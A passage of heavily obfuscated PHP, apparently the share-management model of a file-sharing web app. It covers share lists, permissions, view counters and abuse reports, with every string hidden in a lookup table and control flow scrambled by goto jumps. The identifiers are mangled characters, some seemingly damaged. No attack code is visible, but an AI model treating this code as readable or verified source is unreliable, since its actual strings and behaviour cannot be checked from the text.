$E–Ç§–‹Ù =& $_SERVER[÷ÖêïÔÔÓ]; $e«ø…¥ˆº” = array(array($E–Ç§–‹Ù[442] => array($E–Ç§–‹Ù[922], 0), $E–Ç§–‹Ù[444] => array($E–Ç§–‹Ù[922], 0), $E–Ç§–‹Ù[2118] => $E–Ç§–‹Ù[2087])); if ($Bêé‚äÛè‘ == $E–Ç§–‹Ù[1769]) { $e«ø…¥ˆº” = array($E–Ç§–‹Ù[442] => 1); } else { if ($Bêé‚äÛè‘ == $E–Ç§–‹Ù[980]) { $e«ø…¥ˆº” = array($E–Ç§–‹Ù[444] => 1); } } $e«ø…¥ˆº”[$E–Ç§–‹Ù[1341]] = USER_ID; $D²¦ÖççìÂ = $this->where($e«ø…¥ˆº”)->selectPage($f–ªÏŒÔîê); return $D²¦ÖççìÂ; } protected function listToMe($Eö¦å¦ÀÒÓ = 300) { goto fº•Ì½±êÁ; Dè’° ëä: $eÁÇïÓé—‚ = array($Báôå©ÕÜ[2121] => $e³ÆÜ¿¿êğ, $Báôå©ÕÜ[2122] => $CÙéÛŞ‹Œ[$Báôå©ÕÜ[347]]); return $eÁÇïÓé—‚; goto eÛğÓÎ—â; fº•Ì½±êÁ: $Báôå©ÕÜ =& $_SERVER[÷ÖêïÔÔÓ]; $Bì„¼…†Õ¼ = Session::get($Báôå©ÕÜ[2119]); $e÷ë¿’‰²ã = array_to_keyvalue($Bì„¼…†Õ¼, $Báôå©ÕÜ[33], $Báôå©ÕÜ[2004]); goto aŞ¼¹œÅÃ¢; Eİ·Ÿà„²Ç: $DØªÒŸëòã = array_to_keyvalue_group($CÙéÛŞ‹Œ[$Báôå©ÕÜ[350]], $Báôå©ÕÜ[437]); if (!$DØªÒŸëòã) { return $CÙéÛŞ‹Œ; } $Bó„¤Üã¯Ë = $Báôå©ÕÜ[2120]; goto fœ“»ÑÌØ; fœ“»ÑÌØ: $cš¯’Êí¸î = array($Báôå©ÕÜ[437] => array($Báôå©ÕÜ[381], array_keys($DØªÒŸëòã))); $e³ÆÜ¿¿êğ = $this->field($Bó„¤Üã¯Ë)->where($cš¯’Êí¸î)->select(); foreach ($e³ÆÜ¿¿êğ as $C÷ã»±Á†‹ => &$aº­ëØ †¯) { $aº­ëØ †¯[$Báôå©ÕÜ[2117]] = $DØªÒŸëòã[$aº­ëØ †¯[$Báôå©ÕÜ[437]]]; } goto Dè’° ëä; aŞ¼¹œÅÃ¢: $cš¯’Êí¸î = array($Báôå©ÕÜ[514] => SourceModel::TYPE_USER, $Báôå©ÕÜ[452] => USER_ID); if ($e÷ë¿’‰²ã) { $cš¯’Êí¸î = array(array($Báôå©ÕÜ[514] => SourceModel::TYPE_USER, $Báôå©ÕÜ[452] => USER_ID), array($Báôå©ÕÜ[514] => SourceModel::TYPE_GROUP, $Báôå©ÕÜ[452] => array($Báôå©ÕÜ[7], $e÷ë¿’‰²ã)), $Báôå©ÕÜ[2118] => $Báôå©ÕÜ[2087]); } $CÙéÛŞ‹Œ = Model($Báôå©ÕÜ[529])->where($cš¯’Êí¸î)->selectPage($Eö¦å¦ÀÒÓ); goto Eİ·Ÿà„²Ç; eÛğÓÎ—â: } protected function shareAdd($eÎˆèõ‘©, $dêİ¡ùç«ï) { $d¬Ğ¶ŒÈì¡ =& $_SERVER[÷ÖêïÔÔÓ]; $f‰Š«À¬ö = $this->_addShareData($eÎˆèõ‘©, $dêİ¡ùç«ï); if (isset($dêİ¡ùç«ï[$d¬Ğ¶ŒÈì¡[2123]]) && count($dêİ¡ùç«ï[$d¬Ğ¶ŒÈì¡[2123]]) > 0) { $this->_shareAuthSet($f‰Š«À¬ö, $dêİ¡ùç«ï[$d¬Ğ¶ŒÈì¡[2123]]); } $this->shareEventAdd($eÎˆèõ‘©, $dêİ¡ùç«ï, $d¬Ğ¶ŒÈì¡[983]); return $f‰Š«À¬ö; } private function shareEventAdd($FÈÄ£ª²Š, $E®÷†øòœ, $EÀÍæ®¼¥ = "\141\x64\144") { goto E•§‡Úê®ñ; bøò§†¯´¶: $DŒîÄÁÂª• = $Bğ¤Â¹¢İ»[2126]; if ($eÛ™…„˜ï[$Bğ¤Â¹¢İ»[442]] == $Bğ¤Â¹¢İ»[464] && $E®÷†øòœ[$Bğ¤Â¹¢İ»[442]] == $Bğ¤Â¹¢İ»[493]) { $DŒîÄÁÂª• = $Bğ¤Â¹¢İ»[2124]; } if ($eÛ™…„˜ï[$Bğ¤Â¹¢İ»[442]] == $Bğ¤Â¹¢İ»[493] && $E®÷†øòœ[$Bğ¤Â¹¢İ»[442]] == $Bğ¤Â¹¢İ»[464]) { $DŒîÄÁÂª• = $Bğ¤Â¹¢İ»[2127]; } goto d“¼ÍŠ ®—; C™êÑèèé: return; goto d‘³®åˆ¬¥; d“¼ÍŠ ®—: if ($eÛ™…„˜ï[$Bğ¤Â¹¢İ»[444]] == $Bğ¤Â¹¢İ»[464] && $E®÷†øòœ[$Bğ¤Â¹¢İ»[444]] == $Bğ¤Â¹¢İ»[493]) { $DŒîÄÁÂª• = $Bğ¤Â¹¢İ»[2125]; } if ($eÛ™…„˜ï[$Bğ¤Â¹¢İ»[444]] == $Bğ¤Â¹¢İ»[493] && $E®÷†øòœ[$Bğ¤Â¹¢İ»[444]] == $Bğ¤Â¹¢İ»[464]) { $DŒîÄÁÂª• = $Bğ¤Â¹¢İ»[2128]; } Model($Bğ¤Â¹¢İ»[498])->eventShare($FÈÄ£ª²Š, $DŒîÄÁÂª•); goto C™êÑèèé; E•§‡Úê®ñ: $Bğ¤Â¹¢İ» =& $_SERVER[÷ÖêïÔÔÓ]; if ($EÀÍæ®¼¥ == $Bğ¤Â¹¢İ»[983]) { if ($E®÷†øòœ[$Bğ¤Â¹¢İ»[442]] == $Bğ¤Â¹¢İ»[493]) { Model($Bğ¤Â¹¢İ»[498])->eventShare($FÈÄ£ª²Š, $Bğ¤Â¹¢İ»[2124]); } if ($E®÷†øòœ[$Bğ¤Â¹¢İ»[444]] == $Bğ¤Â¹¢İ»[493]) { Model($Bğ¤Â¹¢İ»[498])->eventShare($FÈÄ£ª²Š, $Bğ¤Â¹¢İ»[2125]); } return; } $eÛ™…„˜ï = $this->getInfoByPath($FÈÄ£ª²Š); goto bøò§†¯´¶; d‘³®åˆ¬¥: } private function _addShareData($C†¿ª‚È¡ä, $BÙ¨å®ÈÏ = array()) { goto eƒôÒ¹¦Ù›; FœùîºÅŸÆ: $c•İô¬õÂ¨ = array($D¸‚Ë•ğä[1332] => USER_ID, $D¸‚Ë•ğä[380] => $C†¿ª‚È¡ä, $D¸‚Ë•ğä[1237] => $D¸‚Ë•ğä[33], $D¸‚Ë•ğä[442] => 0, $D¸‚Ë•ğä[444] => 0, $D¸‚Ë•ğä[991] => $D¸‚Ë•ğä[33], $D¸‚Ë•ğä[292] => $D¸‚Ë•ğä[33], $D¸‚Ë•ğä[797] => $D¸‚Ë•ğä[33], $D¸‚Ë•ğä[2130] => 0, $D¸‚Ë•ğä[2131] => 0, $D¸‚Ë•ğä[689] => 0, $D¸‚Ë•ğä[2132] => $D¸‚Ë•ğä[33], $D¸‚Ë•ğä[439] => $D¸‚Ë•ğä[33]); $C˜Áëò½‚ = explode($D¸‚Ë•ğä[47], $D¸‚Ë•ğä[2133]); foreach ($C˜Áëò½‚ as $fšƒˆ‡íàƒ) { if (!isset($BÙ¨å®ÈÏ[$fšƒˆ‡íàƒ])) { continue; } $c•İô¬õÂ¨[$fšƒˆ‡íàƒ] = $BÙ¨å®ÈÏ[$fšƒˆ‡íàƒ]; } goto B·¡çÖáé‘; BéĞ¸Şá¾É: return $EÊ¤…ª•Ï; goto dÚ­ˆò­Äê; eƒôÒ¹¦Ù›: $D¸‚Ë•ğä =& $_SERVER[÷ÖêïÔÔÓ]; $f¿×À„’¿ˆ = array($D¸‚Ë•ğä[380] => $C†¿ª‚È¡ä, $D¸‚Ë•ğä[1332] => USER_ID); if ($C†¿ª‚È¡ä == 0) { $f¿×À„’¿ˆ = array($D¸‚Ë•ğä[2129] => $BÙ¨å®ÈÏ[$D¸‚Ë•ğä[991]], $D¸‚Ë•ğä[1332] => USER_ID); } goto AïôÜâÀ÷ˆ; AïôÜâÀ÷ˆ: if ($fñä—¶‚ÙÒ = $this->where($f¿×À„’¿ˆ)->find()) { return $fñä—¶‚ÙÒ[$D¸‚Ë•ğä[437]]; } if ($C†¿ª‚È¡ä == 0) { $eÉƒªä×  = array($D¸‚Ë•ğä[28] => get_path_this($BÙ¨å®ÈÏ[$D¸‚Ë•ğä[76]])); } else { $eÉƒªä×  = Model($D¸‚Ë•ğä[748])->sourceInfo($C†¿ª‚È¡ä); if (!$eÉƒªä× ) { return !1; } } if (!$BÙ¨å®ÈÏ[$D¸‚Ë•ğä[1237]]) { $BÙ¨å®ÈÏ[$D¸‚Ë•ğä[1237]] = $eÉƒªä× [$D¸‚Ë•ğä[28]]; } goto FœùîºÅŸÆ; B·¡çÖáé‘: $EÊ¤…ª•Ï = $this->add($c•İô¬õÂ¨); $EÃ¢ÓÇ™´ = array($D¸‚Ë•ğä[439] => short_id($EÊ¤…ª•Ï)); $this->where(array($D¸‚Ë•ğä[436] => $EÊ¤…ª•Ï))->save($EÃ¢ÓÇ™´); goto BéĞ¸Şá¾É; dÚ­ˆò­Äê: } private function _shareAuthSet($f›÷»÷¢ê, $E İÆ¤Ğˆ“) { goto e³ŠÃÄ’Š¸; e³ŠÃÄ’Š¸: $F¿Ä³¾áÃ =& $_SERVER[÷ÖêïÔÔÓ]; if (!is_array($E İÆ¤Ğˆ“)) { return !1; } $D·ø³Ù©¼° = Model($F¿Ä³¾áÃ[2134]); goto EÊ‹Æ†êÇÖ; D’½íäø: return $D·ø³Ù©¼°->addAll($E¬Ç—™’’¿, array(), !0); goto A¸ø¤‹İé; EÊ‹Æ†êÇÖ: $D·ø³Ù©¼°->where(array($F¿Ä³¾áÃ[437] => $f›÷»÷¢ê))->delete(); $E¬Ç—™’’¿ = array(); foreach ($E İÆ¤Ğˆ“ as $cÏ­°¬•êí) { $dÂíø¡â³æ = SourceModel::TYPE_USER; if ($cÏ­°¬•êí[$F¿Ä³¾áÃ[368]] == SourceModel::TYPE_GROUP) { $dÂíø¡â³æ = SourceModel::TYPE_GROUP; } $E™Æë¤ÔË³ = array($F¿Ä³¾áÃ[437] => $f›÷»÷¢ê, $F¿Ä³¾áÃ[368] => $dÂíø¡â³æ, $F¿Ä³¾áÃ[452] => intval($cÏ­°¬•êí[$F¿Ä³¾áÃ[452]]), $F¿Ä³¾áÃ[2135] => 0, $F¿Ä³¾áÃ[2136] => -1); if ($cÏ­°¬•êí[$F¿Ä³¾áÃ[2135]]) { $E™Æë¤ÔË³[$F¿Ä³¾áÃ[2135]] = $cÏ­°¬•êí[$F¿Ä³¾áÃ[2135]]; } else { if ($cÏ­°¬•êí[$F¿Ä³¾áÃ[2136]]) { $E™Æë¤ÔË³[$F¿Ä³¾áÃ[2136]] = $cÏ­°¬•êí[$F¿Ä³¾áÃ[2136]]; } } $E¬Ç—™’’¿[] = $E™Æë¤ÔË³; } goto D’½íäø; A¸ø¤‹İé: } public function numViewAdd($c«Œ§İ‰©) { $C™ô§¡Ôº” =& $_SERVER[÷ÖêïÔÔÓ]; $Eğ™òœ˜… = array($C™ô§¡Ôº”[436] => $c«Œ§İ‰©); $this->where($Eğ™òœ˜…)->setAdd($C™ô§¡Ôº”[2130]); } public function numDownloadAdd($Cì‹ª–«Œ ) { $A‡Ã¿Íñ¹¥ =& $_SERVER[÷ÖêïÔÔÓ]; $E•“ËæØ«Ş = array($A‡Ã¿Íñ¹¥[436] => $Cì‹ª–«Œ ); $this->where($E•“ËæØ«Ş)->setAdd($A‡Ã¿Íñ¹¥[2131]); } protected function shareEdit($FªÉªÆĞ‰, $eª“Å¨ò…ö) { goto fäĞ¿¹; E¥ÖÍ°«‹î: if (isset($eª“Å¨ò…ö[$aæ…¾°™ùÍ[2123]])) { $this->_shareAuthSet($FªÉªÆĞ‰, $eª“Å¨ò…ö[$aæ…¾°™ùÍ[2123]]); } return !0; goto A¿‚™ Ø±; F´Á‹ƒõ³Ï: foreach ($d—†ò­Šè as $B”¿ù´ƒ) { if (!array_key_exists($B”¿ù´ƒ, $eª“Å¨ò…ö)) { continue; } $DÀíÅÙæ[$B”¿ù´ƒ] = $eª“Å¨ò…ö[$B”¿ù´ƒ]; } $this->shareEventAdd($CÙÌİè§ÚÛ[$aæ…¾°™ùÍ[366]], $eª“Å¨ò…ö, $aæ…¾°™ùÍ[1973]); $this->where(array($aæ…¾°™ùÍ[436] => $FªÉªÆĞ‰))->save($DÀíÅÙæ); goto E¥ÖÍ°«‹î; fäĞ¿¹: $aæ…¾°™ùÍ =& $_SERVER[÷ÖêïÔÔÓ]; $CÙÌİè§ÚÛ = $this->getInfo($FªÉªÆĞ‰); if (!$CÙÌİè§ÚÛ) { return !1; } goto aŞ¬ÚÖˆä¤; aŞ¬ÚÖˆä¤: $this->_checkLinkShare($eª“Å¨ò…ö, $CÙÌİè§ÚÛ); $DÀíÅÙæ = array(); $d—†ò­Šè = explode($aæ…¾°™ùÍ[47], $aæ…¾°™ùÍ[2137]); goto F´Á‹ƒõ³Ï; A¿‚™ Ø±: } private function _checkLinkShare($då¤ï¥¥Ò³, $CÃÑ‘ò¼·) { $b˜¬éËæµ =& $_SERVER[÷ÖêïÔÔÓ]; if ($då¤ï¥¥Ò³[$b˜¬éËæµ[442]] != $b˜¬éËæµ[493] || $CÃÑ‘ò¼·[$b˜¬éËæµ[388]][$b˜¬éËæµ[29]] != $b˜¬éËæµ[164]) { return; } $d§öÛ†Õ–¶ = Model($b˜¬éËæµ[748])->fileInfoGet($CÃÑ‘ò¼·[$b˜¬éËæµ[388]][$b˜¬éËæµ[366]]); if (!$d§öÛ†Õ–¶) { return; } $a©àŸ¤’ñ˜ = $this->shareFileMeta($d§öÛ†Õ–¶[$b˜¬éËæµ[415]]); if (isset($a©àŸ¤’ñ˜[$b˜¬éËæµ[354]]) && $a©àŸ¤’ñ˜[$b˜¬éËæµ[354]] == $b˜¬éËæµ[493]) { show_json(LNG($b˜¬éËæµ[2138]), !1); } } protected function remove($C¤ƒÔğâõÀ) { goto E´ÊÄ¨¾°¿; B±Ÿë¬ÓØ: for ($añáòô¡¢Ú = 0; $añáòô¡¢Ú < count($CÏ¾‘¿Ï¯); $añáòô¡¢Ú++) { $bÙµòÃ×Şê = $this->getInfo($CÏ¾‘¿Ï¯[$añáòô¡¢Ú]); if ($bÙµòÃ×Şê[$A’†Öõš±Æ[444]] == $A’†Öõš±Æ[493]) { Model($A’†Öõš±Æ[498])->eventShare($bÙµòÃ×Şê[$A’†Öõš±Æ[366]], $A’†Öõš±Æ[2128]); } if ($bÙµòÃ×Şê[$A’†Öõš±Æ[442]] == $A’†Öõš±Æ[493]) { Model($A’†Öõš±Æ[498])->eventShare($bÙµòÃ×Şê[$A’†Öõš±Æ[366]], $A’†Öõš±Æ[2127]); } } return $e‚ÅÑ¨Õã£; goto e†Ÿî©ø»Ï; E´ÊÄ¨¾°¿: $A’†Öõš±Æ =& $_SERVER[÷ÖêïÔÔÓ]; if (is_array($C¤ƒÔğâõÀ)) { $C¤ƒÔğâõÀ = array($A’†Öõš±Æ[7], $C¤ƒÔğâõÀ); } $DŒâêéâù¼ = array($A’†Öõš±Æ[437] => $C¤ƒÔğâõÀ); goto a®î¼ÇÓ«; a®î¼ÇÓ«: $e‚ÅÑ¨Õã£ = $this->where($DŒâêéâù¼)->delete(); if ($e‚ÅÑ¨Õã£) { Model($A’†Öõš±Æ[529])->where(array($A’†Öõš±Æ[437] => $C¤ƒÔğâõÀ))->delete(); } $CÏ¾‘¿Ï¯ = is_array($C¤ƒÔğâõÀ) ? $C¤ƒÔğâõÀ[1] : array($C¤ƒÔğâõÀ); goto B±Ÿë¬ÓØ; e†Ÿî©ø»Ï: } protected function removeBySource($d”éÚéãœ×) { goto fãŞˆÖ¼ïã; e—¸¢¾Ö: $this->where($FŞ‡ÓğÊÃ)->delete(); Model($F—“æÚˆ‹ƒ[529])->where($FŞ‡ÓğÊÃ)->delete(); goto c¤¥é×”Ø; fãŞˆÖ¼ïã: $F—“æÚˆ‹ƒ =& $_SERVER[÷ÖêïÔÔÓ]; $FŞ‡ÓğÊÃ = array($F—“æÚˆ‹ƒ[380] => array($F—“æÚˆ‹ƒ[381], $d”éÚéãœ×)); $cŒ¼İÅ‘”¡ = $this->field($F—“æÚˆ‹ƒ[437])->where($FŞ‡ÓğÊÃ)->select(); goto bõ¯’¹ÑÉÖ; bõ¯’¹ÑÉÖ: $cŒ¼İÅ‘”¡ = array_to_keyvalue($cŒ¼İÅ‘”¡, $F—“æÚˆ‹ƒ[33], $F—“æÚˆ‹ƒ[437]); if (!$cŒ¼İÅ‘”¡) { return; } $FŞ‡ÓğÊÃ = array($F—“æÚˆ‹ƒ[436] => array($F—“æÚˆ‹ƒ[381], $cŒ¼İÅ‘”¡)); goto e—¸¢¾Ö; c¤¥é×”Ø: } public function listAll($b¶óİ¯´ÓÃ) { goto aá…ìÛæÍ„; bœ¯»ùÒÓ: $dºÙõ¶¦Ş = $this->_makeOrder()->where($fˆ»î˜Š”)->selectPage(20); if (empty($dºÙõ¶¦Ş[$bÑìŸ§ù§˜[350]])) { return array(); } $this->_listDataApply($dºÙõ¶¦Ş[$bÑìŸ§ù§˜[350]]); goto Bâ œÒÒ®Ê; aá…ìÛæÍ„: $bÑìŸ§ù§˜ =& $_SERVER[÷ÖêïÔÔÓ]; $fˆ»î˜Š” = array(); if ($b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[1341]]) { $fˆ»î˜Š”[$bÑìŸ§ù§˜[1341]] = $b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[1341]]; } goto aÕ¥²¡™–¼; aÕ¥²¡™–¼: if ($b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[688]]) { $dóô¦¬íİ = $b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[689]] ? $b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[689]] : strtotime(date($bÑìŸ§ù§˜[2139])); $fˆ»î˜Š”[$bÑìŸ§ù§˜[184]] = array($bÑìŸ§ù§˜[318], array($b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[688]], $dóô¦¬íİ)); } if ($b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[29]]) { $fˆ»î˜Š”[$b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[29]]] = 1; } else { $fˆ»î˜Š”[] = array($bÑìŸ§ù§˜[442] => array($bÑìŸ§ù§˜[922], 0), $bÑìŸ§ù§˜[444] => array($bÑìŸ§ù§˜[922], 0), $bÑìŸ§ù§˜[2118] => $bÑìŸ§ù§˜[2087]); } if ($b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[2083]]) { $fˆ»î˜Š”[] = array($bÑìŸ§ù§˜[439] => $b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[2083]], $bÑìŸ§ù§˜[1237] => array($bÑìŸ§ù§˜[747], "\45{$b¶óİ¯´ÓÃ[$bÑìŸ§ù§˜[2083]]}\x25"), $bÑìŸ§ù§˜[2118] => $bÑìŸ§ù§˜[2087]); } goto bœ¯»ùÒÓ; Bâ œÒÒ®Ê: return $dºÙõ¶¦Ş; goto EİÒãßò±•; EİÒãßò±•: } private function _listDataApply(&$F˜˜ŒâÁ×•) { $b’—æÏƒ¹ë =& $_SERVER[÷ÖêïÔÔÓ]; $C¾ƒ²°ìƒ‹ = array_to_keyvalue($F˜˜ŒâÁ×•, $b’—æÏƒ¹ë[33], $b’—æÏƒ¹ë[1341]); $fó„¹íáÏ² = Model($b’—æÏƒ¹ë[469])->userListInfo(array_unique($C¾ƒ²°ìƒ‹)); $dÒé¡ÉìøÂ = array_to_keyvalue($F˜˜ŒâÁ×•, $b’—æÏƒ¹ë[33], $b’—æÏƒ¹ë[366]); $f‘°éì‡à¼ = Model($b’—æÏƒ¹ë[748])->sourceListInfo($dÒé¡ÉìøÂ, !0); foreach ($F˜˜ŒâÁ×• as &$d±ÓËøíê) { $eİš…Ï¨ø¿ = $d±ÓËøíê[$b’—æÏƒ¹ë[1341]]; $d±ÓËøíê[$b’—æÏƒ¹ë[2140]] = $fó„¹íáÏ²[$eİš…Ï¨ø¿] ? $fó„¹íáÏ²[$eİš…Ï¨ø¿] : !1; $Bä‹÷’„¸ = $d±ÓËøíê[$b’—æÏƒ¹ë[366]]; $d±ÓËøíê[$b’—æÏƒ¹ë[388]] = $f‘°éì‡à¼[$Bä‹÷’„¸] ? $f‘°éì‡à¼[$Bä‹÷’„¸] : !1; } } private function _makeOrder($DÎí¹‘ì™È = '') { goto fó¡¡ÁŠñ; aé£ÌÄÊ”: $CÕÎ‘¶«Õ¦ = Input::get($c‘ÙˆÅ××‘[403], $c‘ÙˆÅ××‘[7], $c‘ÙˆÅ××‘[386], $f¬¸‹èº¹×); $aàå›ÂÔ…å = Input::get($c‘ÙˆÅ××‘[404], $c‘ÙˆÅ××‘[7], $c‘ÙˆÅ××‘[2141], array($c‘ÙˆÅ××‘[2082], $c‘ÙˆÅ××‘[400])); $aàå›ÂÔ…å = $B‹ÜëäŞçé[$aàå›ÂÔ…å]; goto c‡Ş¡éÚŞ; fó¡¡ÁŠñ: $c‘ÙˆÅ××‘ =& $_SERVER[÷ÖêïÔÔÓ]; $f¬¸‹èº¹× = array($c‘ÙˆÅ××‘[184], $c‘ÙˆÅ××‘[689], $c‘ÙˆÅ××‘[2130], $c‘ÙˆÅ××‘[2131]); $B‹ÜëäŞçé = array($c‘ÙˆÅ××‘[398] => $c‘ÙˆÅ××‘[399], $c‘ÙˆÅ××‘[400] => $c‘ÙˆÅ××‘[401]); goto aé£ÌÄÊ”; c‡Ş¡éÚŞ: $DÎí¹‘ì™È = $DÎí¹‘ì™È . "{$CÕÎ‘¶«Õ¦}\40{$aàå›ÂÔ…å}"; return $this->order($DÎí¹‘ì™È); goto bòà”Ë·É; bòà”Ë·É: } public function reportAdd($bÁá«é¶) { $A„ë¢òØ¯ =& $_SERVER[÷ÖêïÔÔÓ]; $EÀõ–¨’çñ = array($A„ë¢òØ¯[437] => $bÁá«é¶[$A„ë¢òØ¯[437]], $A„ë¢òØ¯[1341] => USER_ID); if (Model($A„ë¢òØ¯[2142])->where($EÀõ–¨’çñ)->find()) { return !1; } $CÚ‹ŸÕ¥…ˆ = array($A„ë¢òØ¯[437] => $bÁá«é¶[$A„ë¢òØ¯[437]], $A„ë¢òØ¯[1237] => $bÁá«é¶[$A„ë¢òØ¯[1237]], $A„ë¢òØ¯[366] => $bÁá«é¶[$A„ë¢òØ¯[366]], $A„ë¢òØ¯[415] => $bÁá«é¶[$A„ë¢òØ¯[415]], $A„ë¢òØ¯[1341] => USER_ID, $A„ë¢òØ¯[29] => $bÁá«é¶[$A„ë¢òØ¯[29]], $A„ë¢òØ¯[401] => $bÁá«é¶[$A„ë¢òØ¯[401]]); return Model($A„ë¢òØ¯[2142])->add($CÚ‹ŸÕ¥…ˆ); } public function reportList($c«ÎÍ„æ¢‰) { goto c¢õçãçÛ; c¢õçãçÛ: $E“·Çí¾¯¥ =& $_SERVER[÷ÖêïÔÔÓ]; $d‡‡Õòö™‰ = array(); if ($c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[688]]) { $DøíßŠö¤Š = $c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[689]] ? $c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[689]] : strtotime(date($E“·Çí¾¯¥[2139])); $d‡‡Õòö™‰[$E“·Çí¾¯¥[184]] = array($E“·Çí¾¯¥[318], array($c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[688]], $DøíßŠö¤Š)); } goto CíØİ‹èó÷; Dî¯ÖäËÖ˜: $FîŸ¥îĞàó = array($E“·Çí¾¯¥[398] => $E“·Çí¾¯¥[399], $E“·Çí¾¯¥[400] => $E“·Çí¾¯¥[401]); $c‘•é¹¢Ÿ÷ = $E“·Çí¾¯¥[2146] . $FîŸ¥îĞàó[$aøô›‹®ÜÅ]; $fÅ³§ğôâ“ = Model($E“·Çí¾¯¥[2142])->where($d‡‡Õòö™‰)->order($c‘•é¹¢Ÿ÷)->selectPage(20); goto dªø„¹¹‚Ù; CíØİ‹èó÷: if (isset($c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[29]]) && in_array($c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[29]], array($E“·Çí¾¯¥[493], $E“·Çí¾¯¥[2143], $E“·Çí¾¯¥[2144], $E“·Çí¾¯¥[2145], $E“·Çí¾¯¥[1821]))) { $d‡‡Õòö™‰[$E“·Çí¾¯¥[29]] = $c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[29]]; } if (isset($c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[675]]) && in_array($c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[675]], array($E“·Çí¾¯¥[464], $E“·Çí¾¯¥[493], $E“·Çí¾¯¥[2143], $E“·Çí¾¯¥[2144]))) { $d‡‡Õòö™‰[$E“·Çí¾¯¥[675]] = $c«ÎÍ„æ¢‰[$E“·Çí¾¯¥[675]]; } $aøô›‹®ÜÅ = Input::get($E“·Çí¾¯¥[404], $E“·Çí¾¯¥[7], $E“·Çí¾¯¥[2141], array($E“·Çí¾¯¥[2082], $E“·Çí¾¯¥[400])); goto Dî¯ÖäËÖ˜; dªø„¹¹‚Ù: if (empty($fÅ³§ğôâ“[$E“·Çí¾¯¥[350]])) { return array(); } $this->_listDataApply($fÅ³§ğôâ“[$E“·Çí¾¯¥[350]]); return $fÅ³§ğôâ“; goto AñùóÈÇ; AñùóÈÇ: } public function reportStatus($BŒïª´Ë¶˜) { goto eƒÌ•Í„ùÁ; AŒ”„ÁˆŠ˜: return $e—Ğƒ†èãÃ; goto AÔ†§¨Ûï; B°²æÃ¡¢ä: if (!$Cí¶±›) { return !1; } $AÜ¶¼‡×Ï‰ = array($d³ë½Š²¶[675] => $BŒïª´Ë¶˜[$d³ë½Š²¶[675]]); if ($BŒïª´Ë¶˜[$d³ë½Š²¶[675]] == $d³ë½Š²¶[2144] && $Cí¶±›[$d³ë½Š²¶[675]] == $d³ë½Š²¶[2144]) { $AÜ¶¼‡×Ï‰[$d³ë½Š²¶[675]] = 0; } goto E…âô…‘ƒĞ; E…âô…‘ƒĞ: $e—Ğƒ†èãÃ = Model($d³ë½Š²¶[2142])->where($Fêìëì“‰ø)->save($AÜ¶¼‡×Ï‰); if ($BŒïª´Ë¶˜[$d³ë½Š²¶[675]] == $d³ë½Š²¶[2143]) { if ($Cí¶±›[$d³ë½Š²¶[415]] != $d³ë½Š²¶[464] && $this->shareFileMeta($Cí¶±›[$d³ë½Š²¶[415]])) { $this->shareFileMeta($Cí¶±›[$d³ë½Š²¶[415]], 0); } return $this->remove($Cí¶±›[$d³ë½Š²¶[437]]); } if ($e—Ğƒ†èãÃ && $BŒïª´Ë¶˜[$d³ë½Š²¶[675]] == $d³ë½Š²¶[2144]) { $bÖöäœš“ = $AÜ¶¼‡×Ï‰[$d³ë½Š²¶[675]] == $d³ë½Š²¶[2144] ? 1 : 0; $this->shareFileMeta($Cí¶±›[$d³ë½Š²¶[415]], $bÖöäœš“); $this->removeByFile($Cí¶±›[$d³ë½Š²¶[415]]); } goto AŒ”„ÁˆŠ˜; eƒÌ•Í„ùÁ: $d³ë½Š²¶ =& $_SERVER[÷ÖêïÔÔÓ]; $Fêìëì“‰ø = array($d³ë½Š²¶[364] => $BŒïª´Ë¶˜[$d³ë½Š²¶[364]]); $Cí¶±› = Model($d³ë½Š²¶[2142])->where($Fêìëì“‰ø)->field($d³ë½Š²¶[2147])->find(); goto B°²æÃ¡¢ä; AÔ†§¨Ûï: } private function removeByFile($eºÈ²¥ä’„) { goto FÎ‡×ñ±çå; FÎ‡×ñ±çå: $eÉÄÑåó· =& $_SERVER[÷ÖêïÔÔÓ]; $Bùéì‰‡Ù = Model($eÉÄÑåó·[748])->where(array($eÉÄÑåó·[415] => $eºÈ²¥ä’„))->field($eÉÄÑåó·[366])->select(); $fÙÙĞ‹Œ£ä = array_to_keyvalue($Bùéì‰‡Ù, $eÉÄÑåó·[33], $eÉÄÑåó·[366]); goto F÷Ëºù¬’ó; fß¼¸²–´Â: $this->remove($AØÛ›©©ô); goto EÌÂ¹˜‡¢µ; F÷Ëºù¬’ó: $bÑà¦ï…Á™ = array($eÉÄÑåó·[366] => array($eÉÄÑåó·[7], $fÙÙĞ‹Œ£ä), $eÉÄÑåó·[442] => 1); $Bùéì‰‡Ù = Model($eÉÄÑåó·[1981])->where($bÑà¦ï…Á™)->field($eÉÄÑåó·[437])->select(); $AØÛ›©©ô = array_to_keyvalue($Bùéì‰‡Ù, $eÉÄÑåó·[33], $eÉÄÑåó·[437]); goto fß¼¸²–´Â; EÌÂ¹˜‡¢µ: } private function shareFileMeta($d†µÃÈõñµ, $CŒ¨İŞ‹µ… = null) { $a‡â­ŞĞ‚Ñ =& $_SERVER[÷ÖêïÔÔÓ]; $B–Šˆ¢ƒ = array($a‡â­ŞĞ‚Ñ[415] => $d†µÃÈõñµ, $a‡â­ŞĞ‚Ñ[88] => $a‡â­ŞĞ‚Ñ[2148]); if (is_null($CŒ¨İŞ‹µ…)) { return Model($a‡â­ŞĞ‚Ñ[2149])->where($B–Šˆ¢ƒ)->find(); } $B–Šˆ¢ƒ[$a‡â­ŞĞ‚Ñ[354]] = $CŒ¨İŞ‹µ…; Model($a‡â­ŞĞ‚Ñ[2149])->add($B–Šˆ¢ƒ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = 